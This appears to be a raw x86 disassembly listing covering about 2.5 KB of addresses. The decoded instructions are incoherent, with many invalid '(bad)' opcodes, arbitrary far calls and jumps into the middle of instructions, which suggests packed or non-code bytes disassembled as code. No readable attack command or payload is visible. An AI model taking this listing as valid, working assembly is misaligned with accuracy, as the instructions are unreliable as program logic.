  42d193:	xor    BYTE PTR [esi+ebp*1+0x64],cl
  42d197:	ins    DWORD PTR es:[edi],dx
  42d198:	sub    al,0x7c
  42d19a:	adc    DWORD PTR [eax+0x905c92e],ebx
  42d1a0:	add    ebx,edx
  42d1a2:	call   0xb152:0x9ac393a
  42d1a9:	xor    BYTE PTR [edi-0x29],cl
  42d1ac:	fistp  DWORD PTR ds:0x5eb52cb6
  42d1b2:	jmp    0x42d230
  42d1b4:	push   ecx
  42d1b5:	adc    al,0xa8
  42d1b7:	pop    ebp
  42d1b8:	push   cs
  42d1b9:	pop    ebp
  42d1ba:	xor    esi,DWORD PTR [edi-0x6f519f54]
  42d1c0:	jge    0x42d201
  42d1c2:	xor    DWORD PTR [esi+0x953903e],0xa59079fd
  42d1cc:	or     edx,DWORD PTR [edx]
  42d1ce:	push   DWORD PTR [eax-0x2]
  42d1d1:	xchg   ebx,eax
  42d1d2:	pop    ebx
  42d1d3:	(bad)  [ebp-0x10b0de18]
  42d1d9:	call   0x9ee6:0x9c9b185d
  42d1e0:	fsubrp st(7),st
  42d1e2:	call   0x8247:0xf8f51ed3
  42d1e9:	cmp    BYTE PTR [edx+0x6ce85b8],dh
  42d1ef:	icebp  
  42d1f0:	dec    eax
  42d1f1:	(bad)  
  42d1f2:	mov    ?,WORD PTR [ecx]
  42d1f4:	add    bl,BYTE PTR [eax-0x16d8bf34]
  42d1fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d1fb:	dec    esi
  42d1fc:	xchg   edx,eax
  42d1fd:	jmp    0x458821fc
  42d202:	xchg   ebx,eax
  42d203:	push   cs
  42d204:	pop    ecx
  42d205:	dec    esi
  42d206:	jne    0x42d206
  42d208:	sub    BYTE PTR [ecx-0x4a51bffb],0xd2
  42d20f:	repnz add BYTE PTR cs:[eax],al
	...
  42d273:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42d279:	ja     0x42d22a
  42d27b:	sti    
  42d27c:	aaa    
  42d27d:	out    0x36,eax
  42d27f:	ja     0x42d29c
  42d281:	stos   BYTE PTR es:[edi],al
  42d282:	dec    ecx
  42d283:	or     eax,0x1e41d
  42d288:	add    eax,0xa8000001
  42d28d:	ins    BYTE PTR es:[edi],dx
  42d28e:	push   esi
  42d28f:	add    edx,DWORD PTR [eax]
  42d291:	fwait
  42d292:	(bad)  
  42d293:	mov    ds:0xf6bf14ed,ax
  42d299:	push   0xbb4c9630
  42d29e:	dec    ebx
  42d29f:	iret   
  42d2a0:	fnstenv [ecx+eax*4]
  42d2a3:	in     al,dx
  42d2a4:	sbb    BYTE PTR [edx],dl
  42d2a6:	(bad)  
  42d2a7:	out    dx,eax
  42d2a8:	mov    BYTE PTR ds:0x32d548d7,dl
  42d2ae:	retf   0x109e
  42d2b1:	sub    BYTE PTR [ebx-0x53],al
  42d2b4:	outs   dx,DWORD PTR ds:[esi]
  42d2b5:	jns    0x42d25c
  42d2b7:	jecxz  0x42d309
  42d2b9:	push   esp
  42d2ba:	test   BYTE PTR [esi+0x64],0x92
  42d2be:	test   DWORD PTR [edi],ecx
  42d2c0:	jns    0x42d292
  42d2c2:	shr    BYTE PTR [edx-0xf],cl
  42d2c5:	fidiv  DWORD PTR [ebp-0x4e]
  42d2c8:	call   0x2c34:0x5fa477f4
  42d2cf:	xchg   ecx,eax
  42d2d0:	pusha  
  42d2d1:	xor    BYTE PTR [ebx],dh
  42d2d3:	mov    edi,edx
  42d2d5:	rcr    DWORD PTR [eax+0x54],0x42
  42d2d9:	leave  
  42d2da:	sub    eax,0xb8de774e
  42d2df:	and    edi,edx
  42d2e1:	add    DWORD PTR [edi],eax
  42d2e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d2e4:	xor    al,0x7a
  42d2e6:	(bad)  
  42d2e7:	stc    
  42d2e8:	dec    esi
  42d2e9:	je     0x42d283
  42d2eb:	adc    DWORD PTR [edx+0x2d],edi
  42d2ee:	and    DWORD PTR [ebx],eax
  42d2f0:	aas    
  42d2f1:	std    
  42d2f2:	lds    eax,FWORD PTR [ecx+ebx*8+0x72]
  42d2f6:	sub    BYTE PTR [eax+0x69a020f],bh
  42d2fc:	jbe    0x42d313
  42d2fe:	test   DWORD PTR [esi-0x2e522708],ebp
  42d304:	inc    ebp
  42d305:	jp     0x42d338
  42d307:	or     dh,BYTE PTR [edx+0x506fadf4]
  42d30d:	lds    esp,FWORD PTR [ebx+0x6c]
  42d310:	(bad)  
  42d311:	push   esi
  42d312:	retf   0x1abe
  42d315:	pusha  
  42d316:	pop    esp
  42d317:	adc    al,0xc4
  42d319:	out    0xaa,al
  42d31b:	(bad)  
  42d31c:	sub    esi,DWORD PTR [edx-0x6d9efca7]
  42d322:	cmp    DWORD PTR [ebx+0x3efebd00],esi
  42d328:	pusha  
  42d329:	shr    ch,cl
  42d32b:	sahf   
  42d32c:	ins    BYTE PTR es:[di],dx
  42d32e:	outs   dx,DWORD PTR ds:[esi]
  42d32f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d330:	jb     0x42d2b8
  42d332:	inc    edi
  42d333:	or     BYTE PTR [ebp+0x50],bl
  42d336:	and    eax,0xdc5b8b76
  42d33b:	loop   0x42d342
  42d33d:	lods   eax,DWORD PTR ds:[esi]
  42d33e:	mov    edi,0xb1efb6f2
  42d343:	mov    ah,0x97
  42d345:	jecxz  0x42d2c9
  42d347:	jmp    0x42d2d3
  42d349:	fidivr WORD PTR [edi+0x56]
  42d34c:	inc    esi
  42d34d:	mov    bl,0x17
  42d34f:	adc    DWORD PTR [ecx-0x1f560379],ebp
  42d355:	sbb    al,BYTE PTR [edx+0x42]
  42d358:	mov    ecx,0x3d9427e4
  42d35d:	mov    ah,BYTE PTR [edi+ebx*8]
  42d360:	and    al,0x42
  42d362:	pop    es
  42d363:	dec    edi
  42d364:	adc    cl,BYTE PTR [ebp+0x16718e21]
  42d36a:	xchg   DWORD PTR ds:0x86b88ad3,esp
  42d370:	sbb    al,0x72
  42d372:	out    0xee,al
  42d374:	adc    ecx,edi
  42d376:	sub    DWORD PTR [edi+eiz*2],esi
  42d379:	jo     0x42d344
  42d37b:	es rcl ch,cl
  42d37e:	gs adc ah,0x57
  42d382:	xor    al,0x8e
  42d384:	fstp   TBYTE PTR [ecx-0x76b8b45]
  42d38a:	fadd   DWORD PTR [ecx-0x64]
  42d38d:	retf   
  42d38e:	scas   al,BYTE PTR es:[edi]
  42d38f:	cdq    
  42d390:	add    al,BYTE PTR [eax]
	...
  42d3f2:	add    BYTE PTR [eax],al
  42d3f4:	ror    esi,0x63
  42d3f7:	cdq    
  42d3f8:	outs   dx,DWORD PTR ds:[esi]
  42d3f9:	mov    ebp,0x9459defb
  42d3fe:	aaa    
  42d3ff:	pushf  
  42d400:	ins    DWORD PTR es:[edi],dx
  42d401:	lea    eax,[eax+0x1e]
  42d404:	and    ah,ch
  42d406:	add    DWORD PTR [eax],eax
  42d408:	add    eax,0xe3000001
  42d40d:	xor    ecx,DWORD PTR [ebx-0x6d]
  42d410:	mov    dh,0x8d
  42d412:	dec    esp
  42d413:	fisub  DWORD PTR [eax-0xf5f897f]
  42d419:	out    dx,eax
  42d41a:	add    ch,bl
  42d41c:	bound  ebx,QWORD PTR [eax]
  42d41e:	sub    BYTE PTR [ebx],0xc
  42d421:	loope  0x42d4a2
  42d423:	push   0xffffffb5
  42d425:	inc    esp
  42d426:	cli    
  42d427:	pop    eax
  42d428:	sbb    eax,0xd11430f9
  42d42d:	cmp    al,0x21
  42d42f:	icebp  
  42d430:	adc    eax,0x181b9aea
  42d435:	fist   DWORD PTR [edi+ebp*2-0x7d]
  42d439:	sbb    cl,BYTE PTR [eax+0x46]
  42d43c:	dec    ecx
  42d43d:	es mov eax,0x600c512e
  42d443:	mul    DWORD PTR [edi]
  42d445:	lods   al,BYTE PTR ds:[esi]
  42d446:	rcr    BYTE PTR [eax+edx*8+0x25c9ecd4],cl
  42d44d:	xchg   ecx,eax
  42d44e:	and    bl,BYTE PTR [ebx-0x4462379e]
  42d454:	mov    esi,0x830b7fe7
  42d459:	fs add al,0x16
  42d45c:	ds int 0x92
  42d45f:	scas   eax,DWORD PTR es:[edi]
  42d460:	ja     0x42d44c
  42d462:	xchg   esi,eax
  42d463:	das    
  42d464:	(bad)
  42d468:	(bad)  
  42d469:	dec    ebx
  42d46a:	jnp    0x42d3ff
  42d46c:	mov    al,ds:0xe7af7b6e
  42d471:	cmp    eax,0x649ff382
  42d476:	sub    DWORD PTR [ecx+0x69254ec4],ebx
  42d47c:	sbb    ecx,DWORD PTR ds:0x1a602a20
  42d482:	jmp    0x42d4e2
  42d484:	adc    DWORD PTR [edx+0x85eaaf1],ecx
  42d48a:	dec    eax
  42d48b:	dec    esp
  42d48c:	xchg   ebx,eax
  42d48d:	add    al,0xc
  42d48f:	lods   eax,DWORD PTR ds:[esi]
  42d490:	dec    ebx
  42d491:	aad    0xe2
  42d493:	or     bl,cl
  42d495:	xchg   ecx,eax
  42d496:	cld    
  42d497:	adc    BYTE PTR cs:[esi+0x11],0xb6
  42d49c:	pop    edx
  42d49d:	scas   eax,DWORD PTR es:[edi]
  42d49e:	mov    BYTE PTR [esi+edx*8+0x2a0fd8f2],ah
  42d4a5:	ins    DWORD PTR es:[edi],dx
  42d4a6:	mov    eax,ebx
  42d4a8:	nop
  42d4a9:	sti    
  42d4aa:	lock jl 0x42d45a
  42d4ad:	push   ds
  42d4ae:	sub    eax,0x9127e781
  42d4b3:	jp     0x42d451
  42d4b5:	not    DWORD PTR [edx]
  42d4b7:	push   esp
  42d4b8:	aam    0x8c
  42d4ba:	push   ds
  42d4bb:	les    ecx,FWORD PTR [ecx-0x36]
  42d4be:	repz loopne 0x42d525
  42d4c1:	dec    ebp
  42d4c2:	ret    0xd660
  42d4c5:	push   ecx
  42d4c6:	call   0x411a:0xef83a386
  42d4cd:	mov    fs,WORD PTR [edi-0x370e8797]
  42d4d3:	test   eax,0xbe6b9406
  42d4d8:	mov    ah,0xfc
  42d4da:	stc    
  42d4db:	mov    edi,0xce09e506
  42d4e0:	and    eax,DWORD PTR [ebx+0x14]
  42d4e3:	push   esp
  42d4e4:	das    
  42d4e5:	jge    0x42d510
  42d4e7:	jb     0x42d4b2
  42d4e9:	popa   
  42d4ea:	popa   
  42d4eb:	xor    eax,0xb1fd31fb
  42d4f0:	xchg   ebp,eax
  42d4f1:	iret   
  42d4f2:	out    0x75,eax
  42d4f4:	jbe    0x42d47c
  42d4f6:	fnsave [ecx-0x78c0a36]
  42d4fc:	test   al,0xbd
  42d4fe:	mov    bh,0x3a
  42d500:	mov    dh,0x3e
  42d502:	fisttp DWORD PTR [edx+esi*2+0x662dd176]
  42d509:	push   edi
  42d50a:	gs jo  0x42d4fb
  42d50d:	jge    0x42d4f9
  42d50f:	aad    0xe2
	...
  42d571:	add    BYTE PTR [eax],al
  42d573:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42d579:	ja     0x42d554
  42d57b:	call   FWORD PTR [ebp+0x3e]
  42d57e:	mov    ds:0x5c27eed5,eax
  42d583:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d584:	daa    
  42d585:	out    0x1,al
  42d587:	add    BYTE PTR ds:0xe6000001,al
  42d58d:	bts    DWORD PTR [ebx-0x7c202786],edi
  42d594:	ins    DWORD PTR es:[edi],dx
  42d595:	xchg   DWORD PTR [esi+eax*4],edx
  42d598:	push   eax
  42d599:	out    0xd1,eax
  42d59b:	cmp    ebx,DWORD PTR [esi+0x9638262]
  42d5a1:	cmp    dh,cl
  42d5a3:	mov    cl,0xa3
  42d5a5:	xor    ah,BYTE PTR [ebx]
  42d5a7:	mov    esp,DWORD PTR [esi-0x68]
  42d5aa:	mov    ebx,0xd93fb0a2
  42d5af:	out    dx,eax
  42d5b0:	push   esp
  42d5b1:	adc    DWORD PTR [ebx],esp
  42d5b3:	and    DWORD PTR [esi],0x3f
  42d5b6:	add    eax,DWORD PTR [ebp-0x19]
  42d5b9:	push   edx
  42d5ba:	pop    esp
  42d5bb:	scas   eax,DWORD PTR es:[edi]
  42d5bc:	pop    ds
  42d5bd:	aas    
  42d5be:	xchg   ebp,eax
  42d5bf:	xchg   ebx,eax
  42d5c0:	push   es
  42d5c1:	inc    edx
  42d5c2:	pushf  
  42d5c3:	les    ecx,FWORD PTR [edx+0x474d7ab6]
  42d5c9:	push   es
  42d5ca:	xor    esp,DWORD PTR [ebx]
  42d5cc:	ror    BYTE PTR ds:0x7e9c957e,cl
  42d5d2:	jp     0x42d5eb
  42d5d4:	lods   al,BYTE PTR ds:[esi]
  42d5d5:	mov    ch,0xa8
  42d5d7:	not    BYTE PTR [edi+0x31b23288]
  42d5dd:	xchg   ebp,eax
  42d5de:	push   ebp
  42d5df:	(bad)  
  42d5e1:	ds sub cl,cl
  42d5e4:	imul   ecx,DWORD PTR [ecx-0x5595fc41],0xce62890a
  42d5ee:	sbb    cl,bh
  42d5f0:	imul   eax,ecx,0xe4be2519
  42d5f6:	jns    0x42d5bb
  42d5f8:	sti    
  42d5f9:	lods   al,BYTE PTR ds:[esi]
  42d5fa:	js     0x42d638
  42d5fc:	and    DWORD PTR [edi+0x6e],edx
  42d5ff:	imul   esi,DWORD PTR [edi+0x4fc8f076],0xece23b8a
  42d609:	fwait
  42d60a:	mov    edi,0x12cfd6bb
  42d60f:	shl    DWORD PTR [edi-0x14],cl
  42d612:	inc    ebp
  42d613:	jb     0x42d674
  42d615:	mov    cl,BYTE PTR [ecx]
  42d617:	sbb    eax,eax
  42d619:	in     al,dx
  42d61a:	scas   al,BYTE PTR es:[edi]
  42d61b:	xchg   edi,eax
  42d61c:	jl     0x42d65f
  42d61e:	xchg   edi,eax
  42d61f:	das    
  42d620:	xchg   ebx,eax
  42d621:	mov    ecx,0x5c691dfa
  42d626:	fild   DWORD PTR [ecx]
  42d628:	enter  0x9a68,0x2b
  42d62c:	fst    st(5)
  42d62e:	int    0x3b
  42d630:	inc    ebx
  42d631:	xchg   BYTE PTR [eax+0x415a2640],bh
  42d637:	retf   0xea2b
  42d63a:	pusha  
  42d63b:	xchg   DWORD PTR [eax-0x3257b130],esi
  42d641:	mov    eax,0xe6e5ca17
  42d646:	int    0xd5
  42d648:	and    al,0x69
  42d64a:	call   0x9b5:0x7a9e95c6
  42d651:	and    DWORD PTR [esi+esi*8],edx
  42d654:	inc    eax
  42d655:	sub    BYTE PTR ds:0x6018724,dh
  42d65b:	push   edi
  42d65c:	or     BYTE PTR [edx],ch
  42d65e:	(bad)  
  42d65f:	clc    
  42d660:	mov    esi,0x74de32fe
  42d665:	or     eax,0x7aaa6eb3
  42d66a:	test   ah,cl
  42d66c:	(bad)  
  42d66d:	(bad)  
  42d66e:	pop    ebp
  42d66f:	ins    BYTE PTR es:[edi],dx
  42d670:	leave  
  42d671:	lods   eax,DWORD PTR ds:[esi]
  42d672:	mov    dl,0x90
  42d674:	or     al,0xc8
  42d676:	loop   0x42d656
  42d678:	mov    bl,0x2f
  42d67a:	jbe    0x42d665
  42d67c:	fidivr DWORD PTR [eax]
  42d67e:	inc    esp
  42d67f:	(bad)  
  42d680:	out    dx,eax
  42d681:	mov    ebp,0x10b462b8
  42d686:	call   0xacc2:0xdc0701ca
  42d68d:	inc    ebp
  42d68e:	adc    al,0xfb
  42d690:	add    eax,DWORD PTR [eax]
	...
  42d6f2:	add    BYTE PTR [eax],al
  42d6f4:	repz add esp,DWORD PTR [eax]
  42d6f7:	(bad)  
  42d6f8:	lock scas eax,DWORD PTR es:[edi]
  42d6fa:	(bad)  
  42d6fb:	jg     0x42d67e
  42d6fd:	in     al,0x2c
  42d6ff:	and    al,0x6
  42d701:	push   es
  42d702:	dec    ebp
  42d703:	sbb    ebp,DWORD PTR [edi+eiz*8]
  42d706:	add    DWORD PTR [eax],eax
  42d708:	add    eax,0xed000001
  42d70d:	cmp    DWORD PTR [edi+0x5db610d4],edx
  42d713:	fmul   st,st(7)
  42d715:	mov    eax,0xeefbbb81
  42d71a:	sub    BYTE PTR [edi+0x57],dh
  42d71d:	cli    
  42d71e:	jp     0x42d6a6
  42d720:	xlat   BYTE PTR ds:[ebx]
  42d721:	mov    ch,0xa0
  42d723:	call   0x533:0xae65f89b
  42d72a:	ror    bl,0x47
  42d72d:	or     BYTE PTR cs:[esi],cl
  42d730:	push   ecx
  42d731:	into   
  42d732:	ret    0x81d0
  42d735:	add    BYTE PTR [edi],dh
  42d737:	mov    WORD PTR [ebx],fs
  42d739:	and    ecx,DWORD PTR [edx-0xe255dce]
  42d73f:	jns    0x42d704
  42d741:	in     al,dx
  42d742:	outs   dx,DWORD PTR ds:[esi]
  42d743:	jge    0x42d6e3
  42d745:	inc    edi
  42d746:	adc    BYTE PTR [eax-0x76c39a11],0x4a
  42d74d:	stos   DWORD PTR es:[edi],eax
  42d74e:	(bad)  [ebx-0x2dbc18cc]
  42d754:	gs clc 
  42d756:	mov    edi,0x44aabbe8
  42d75b:	adc    dl,BYTE PTR [eax-0x5a]
  42d75e:	clc    
  42d75f:	pop    ebx
  42d760:	in     al,dx
  42d761:	mov    al,ds:0xdbcbc664
  42d766:	push   eax
  42d767:	repnz inc edi
  42d769:	imul   edi,DWORD PTR [ebp-0x69],0x4c3351f0
  42d770:	fadd   DWORD PTR [ecx]
  42d772:	pop    edi
  42d773:	cdq    
  42d774:	jo     0x42d79a
  42d776:	adc    edx,ecx
  42d778:	mov    esi,0xab078288
  42d77d:	loope  0x42d7d8
  42d77f:	dec    ecx
  42d780:	add    al,0xc7
  42d782:	iret   
  42d783:	sbb    bh,BYTE PTR [ebx+0x383173a]
  42d789:	and    ah,BYTE PTR [ecx]
  42d78b:	sub    BYTE PTR [esi+0x5af6f74a],dl
  42d791:	jnp    0x42d7ad
  42d793:	sub    cl,bl
  42d795:	adc    DWORD PTR [ecx-0x52],ebx
  42d798:	imul   eax,DWORD PTR [eax],0xed2637ee
  42d79e:	dec    edi
  42d79f:	mov    dh,0x51
  42d7a1:	dec    ebp
  42d7a2:	jmp    0x49b3:0x95bc075b
  42d7a9:	pop    ss
  42d7aa:	js     0x42d7ce
  42d7ac:	push   ebx
  42d7ad:	mov    ebx,0x54cb9d47
  42d7b2:	retf   
  42d7b3:	dec    edx
  42d7b4:	xchg   ecx,eax
  42d7b5:	mov    dl,0xdd
  42d7b7:	mov    esp,0x3ae2d17e
  42d7bc:	aas    
  42d7bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d7be:	lea    esp,[edx+ecx*8-0x77]
  42d7c2:	xor    al,0x3
  42d7c4:	xlat   BYTE PTR ds:[ebx]
  42d7c5:	call   0x8ad:0xe129761a
  42d7cc:	inc    eax
  42d7cd:	cdq    
  42d7ce:	test   DWORD PTR [eax-0x5ad56173],0x159c48be
  42d7d8:	cmp    edi,DWORD PTR [ecx+0x1d]
  42d7db:	jp     0x42d7e8
  42d7dd:	xchg   ebp,eax
  42d7de:	mov    eax,0x4c33de48
  42d7e3:	out    0x1f,eax
  42d7e5:	addr16 dec esi
  42d7e7:	xor    eax,0x3c48156c
  42d7ec:	enter  0xa3e5,0x10
  42d7f0:	nop
  42d7f1:	repz das 
  42d7f3:	lahf   
  42d7f4:	xchg   ebx,eax
  42d7f5:	xchg   DWORD PTR [edx-0x29c6d265],ebx
  42d7fb:	jnp    0x42d7a3
  42d7fd:	mov    al,ds:0xd426e1f6
  42d802:	rol    BYTE PTR [edx-0x7e],cl
  42d805:	jo     0x42d7fc
  42d807:	xchg   ebx,eax
  42d808:	aas    
  42d809:	push   esi
  42d80a:	mov    BYTE PTR ds:[esi+0x1a280539],bl
	...
  42d871:	add    BYTE PTR [eax],al
  42d873:	add    BYTE PTR [esi-0x62a06765],dl
  42d879:	pop    edi
  42d87a:	xlat   BYTE PTR ds:[ebx]
  42d87b:	fistp  DWORD PTR ds:0x79c6961a
  42d881:	icebp  
  42d882:	xor    bl,BYTE PTR [ebx]
  42d884:	xor    eax,ebp
  42d886:	add    DWORD PTR [eax],eax
  42d888:	add    eax,0xc4000001
  42d88d:	ja     0x42d8d4
  42d88f:	sti    
  42d890:	adc    dl,0xb
  42d893:	call   0xbae4:0x6ff680db
  42d89a:	mov    DWORD PTR [eax-0x1be5037a],ebp
  42d8a0:	xchg   ebx,eax
  42d8a1:	xchg   ebx,eax
  42d8a2:	pop    ebp
  42d8a3:	lea    esp,[edx]
  42d8a5:	cwde   
  42d8a6:	jnp    0x42d8b0
  42d8a8:	sbb    esp,DWORD PTR [ecx]
  42d8aa:	mov    dl,BYTE PTR [ecx]
  42d8ac:	sub    esi,DWORD PTR [edx-0x55b08599]
  42d8b2:	sti    
  42d8b3:	dec    esi
  42d8b4:	jnp    0x42d8a9
  42d8b6:	jno    0x42d894
  42d8b8:	pop    ebp
  42d8b9:	sbb    ch,BYTE PTR [ebx+0x69]
  42d8bc:	pop    ecx
  42d8bd:	scas   eax,DWORD PTR es:[edi]
  42d8be:	mov    ecx,0xb4328476
  42d8c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d8c4:	outs   dx,BYTE PTR ds:[esi]
  42d8c5:	jnp    0x42d917
  42d8c7:	mov    ebp,0x5aa80472
  42d8cc:	fldcw  WORD PTR [eax]
  42d8ce:	inc    esp
  42d8cf:	test   eax,0x461fbd7c
  42d8d4:	cmp    BYTE PTR ds:0xbc18fd5f,dh
  42d8da:	mov    dl,0x47
  42d8dc:	in     al,dx
  42d8dd:	push   edi
  42d8de:	daa    
  42d8df:	mov    cl,BYTE PTR [esi]
  42d8e1:	es mov dh,0x9e
  42d8e4:	mov    eax,0x1e969a90
  42d8e9:	(bad)  
  42d8ea:	call   0xdea1880e
  42d8ef:	mov    eax,0x12a22a0d
  42d8f4:	add    BYTE PTR [ebx-0x6e],cl
  42d8f7:	mov    ch,0x4e
  42d8f9:	pop    es
  42d8fa:	push   0x7e
  42d8fc:	shl    dh,1
  42d8fe:	sbb    bl,BYTE PTR [eax-0x2d]
  42d901:	xchg   ebx,eax
  42d902:	push   ds
  42d903:	lock loopne 0x42d960
  42d906:	fbstp  TBYTE PTR [ecx]
  42d908:	mov    eax,ds:0xf5127a6a
  42d90d:	sub    esp,esp
  42d90f:	fdiv   st(7),st
  42d911:	loop   0x42d8ea
  42d913:	in     al,dx
  42d914:	bswap  esi
  42d916:	outs   dx,BYTE PTR ds:[esi]
  42d917:	sbb    eax,0x848591ed
  42d91c:	aam    0x4c
  42d91e:	ins    DWORD PTR es:[edi],dx
  42d91f:	add    ah,BYTE PTR [ebx+edx*2-0x61]
  42d923:	shl    DWORD PTR [edx],1
  42d925:	hlt    
  42d926:	test   BYTE PTR [ebp+0x68ed540f],ah
  42d92c:	or     ebp,ecx
  42d92e:	or     esp,DWORD PTR [ebx-0x1d27118f]
  42d934:	cld    
  42d935:	xor    dh,dl
  42d937:	sub    dl,BYTE PTR [ecx+0xdeb0ef3]
  42d93d:	dec    ebx
  42d93e:	bound  edx,QWORD PTR [edx+ebp*1-0x66]
  42d942:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d943:	fidivr DWORD PTR [ebx+edi*2]
  42d946:	sub    al,0xfa
  42d948:	xchg   BYTE PTR [esi-0x6fcabe8e],dh
  42d94e:	jns    0x42d903
  42d950:	jnp    0x42d97a
  42d952:	jno    0x42d916
  42d954:	pop    ebp
  42d955:	scas   eax,DWORD PTR es:[edi]
  42d956:	sub    BYTE PTR ds:0xb192ef19,bl
  42d95c:	loop   0x42d950
  42d95e:	push   eax
  42d95f:	push   eax
  42d960:	out    0xb3,al
  42d962:	pop    esi
  42d963:	mov    ebx,DWORD PTR [eax+0xe]
  42d966:	fwait
  42d967:	mov    cl,0x20
  42d969:	xor    eax,0xf8cc44
  42d96e:	stos   BYTE PTR es:[edi],al
  42d96f:	neg    DWORD PTR [eax+0x3e]
  42d972:	sub    ebp,DWORD PTR [esi]
  42d974:	mov    esp,0x6c36d55a
  42d979:	loopne 0x42d941
  42d97b:	dec    edx
  42d97c:	xchg   ebp,eax
  42d97d:	dec    edi
  42d97e:	aad    0x5
  42d980:	mov    es:0x3b43b5a,al
  42d986:	sub    al,0xe3
  42d988:	stos   DWORD PTR es:[edi],eax
  42d989:	in     eax,dx
  42d98a:	fcom   QWORD PTR [ebx+0x88c16b6]
  42d990:	pop    edx
	...
  42d9f1:	add    BYTE PTR [eax],al
  42d9f3:	add    cl,bh
  42d9f5:	mov    cl,0x70
  42d9f7:	dec    eax
  42d9f8:	js     0x42d9c3
  42d9fa:	stc    
  42d9fb:	mov    cl,0xbf
  42d9fd:	dec    edi
  42d9fe:	int    0xe1
  42da00:	fisub  DWORD PTR [ebx-0x16c9c1cd]
  42da06:	add    DWORD PTR [eax],eax
  42da08:	add    eax,0x60000001
  42da0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42da0e:	xor    dl,al
  42da10:	aas    
  42da11:	sbb    ch,BYTE PTR ds:0xa54bc5ee
  42da17:	aad    0xad
  42da19:	hlt    
  42da1a:	sbb    eax,0x9fe1571a
  42da1f:	or     dh,0xac
  42da22:	jne    0x42da15
  42da24:	jecxz  0x42d9c4
  42da26:	lea    edi,[edi-0x14a072e0]
  42da2c:	and    BYTE PTR [eax],ch
  42da2e:	mov    ds,WORD PTR [ebx+0x12ad2434]
  42da34:	jmp    0x43e9719c
  42da39:	mov    al,0xfb
  42da3b:	lods   eax,DWORD PTR ds:[esi]
  42da3c:	imul   eax,DWORD PTR [ecx],0xb24dfd97
  42da42:	add    DWORD PTR [ebx-0x7995f60f],esi
  42da48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42da49:	xor    al,0xac
  42da4b:	push   eax
  42da4c:	ror    DWORD PTR [ebx+0x3e],0xe8
  42da50:	fiadd  WORD PTR [eax]
  42da52:	in     al,0x82
  42da54:	stos   BYTE PTR es:[edi],al
  42da55:	in     al,0xe2
  42da57:	fwait
  42da58:	inc    esp
  42da59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42da5a:	fmul   st,st(1)
  42da5c:	or     DWORD PTR [eax],edi
  42da5e:	mov    ebp,0xfa1c9665
  42da63:	xchg   BYTE PTR [esi+eiz*1],dh
  42da66:	add    eax,0x3815c295
  42da6b:	inc    eax
  42da6c:	jmp    0x65b9:0x37141d8a
  42da73:	loope  0x42da0f
  42da75:	dec    ecx
  42da76:	loop   0x42da61
  42da78:	(bad)  
  42da7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42da7b:	mov    esp,0xe1c8b78e
  42da80:	cmp    al,0x98
  42da82:	sbb    eax,0x383c5525
  42da87:	jmp    0x8f4463ab
  42da8c:	pop    ss
  42da8d:	add    eax,0x96aafea5
  42da92:	(bad)  ds:0x2e2b99aa
  42da98:	cmc    
  42da99:	and    BYTE PTR [ebx],cl
  42da9b:	or     DWORD PTR [edi],esp
  42da9d:	test   BYTE PTR es:[edx],dh
  42daa0:	mov    ch,BYTE PTR [ecx]
  42daa2:	pop    edx
  42daa3:	test   DWORD PTR [edx-0x9],esp
  42daa6:	dec    esi
  42daa7:	mov    esi,0xb4b76609
  42daac:	mov    ch,0xa9
  42daae:	test   al,0xef
  42dab0:	and    DWORD PTR [eax-0x6f],esi
  42dab3:	cmp    al,0xa6
  42dab5:	xor    eax,esp
  42dab7:	xchg   edi,eax
  42dab8:	loopne 0x42db29
  42daba:	xchg   ebx,eax
  42dabb:	aaa    
  42dabc:	daa    
  42dabd:	imul   BYTE PTR [ecx+0x175c88d]
  42dac3:	xchg   DWORD PTR [edi-0x73],ebp
  42dac6:	popf   
  42dac7:	cli    
  42dac8:	mov    ah,0xb7
  42daca:	mov    al,0x53
  42dacc:	inc    ebx
  42dacd:	xor    eax,0x6f21008d
  42dad2:	hlt    
  42dad3:	daa    
  42dad4:	paddd  mm2,QWORD PTR [ebp+0x4130bd4f]
  42dadb:	nop
  42dadc:	mov    al,ds:0x83c7b863
  42dae1:	fnstcw WORD PTR [edx-0xd41fc0d]
  42dae7:	pushf  
  42dae8:	mov    esp,DWORD PTR [edi+ebp*4+0x49]
  42daec:	outs   dx,DWORD PTR ds:[esi]
  42daed:	cmc    
  42daee:	pop    esp
  42daef:	ret    
  42daf0:	outs   dx,BYTE PTR ds:[esi]
  42daf1:	xor    al,0x98
  42daf3:	push   esi
  42daf4:	jno    0x42db35
  42daf6:	adc    al,0xbb
  42daf8:	adc    cl,ah
  42dafa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dafb:	(bad)  
  42dafd:	jmp    0x212e3904
  42db02:	ret    
  42db03:	call   0x401f:0xc6f67268
  42db0a:	or     eax,0x69858950
  42db0f:	dec    ebx
  42db10:	add    eax,0x0
	...
  42db71:	add    BYTE PTR [eax],al
  42db73:	add    BYTE PTR [eax-0x2093e086],dh
  42db79:	ins    DWORD PTR es:[edi],dx
  42db7a:	repz (bad) 
  42db7c:	fwait
  42db7d:	jns    0x42db1a
  42db7f:	jns    0x42db3b
  42db81:	or     al,0xb
  42db83:	dec    ecx
  42db84:	cmp    ebp,edx
  42db86:	add    DWORD PTR [eax],eax
  42db88:	add    eax,0x33000001
  42db8d:	dec    edx
  42db8e:	ret    
  42db8f:	fsub   DWORD PTR [esi+0x6b5c5aa7]
  42db95:	add    BYTE PTR ds:0xde74e1e3,0x6f
  42db9c:	xchg   DWORD PTR [ebp-0x6835e7e1],eax
  42dba2:	js     0x42dba7
  42dba4:	inc    ebp
  42dba5:	sbb    al,0x54
  42dba7:	retf   
  42dba8:	push   edx
  42dba9:	jno    0x42dc19
  42dbab:	sar    ch,0x9e
  42dbae:	add    bh,0xa1
  42dbb1:	xchg   edx,eax
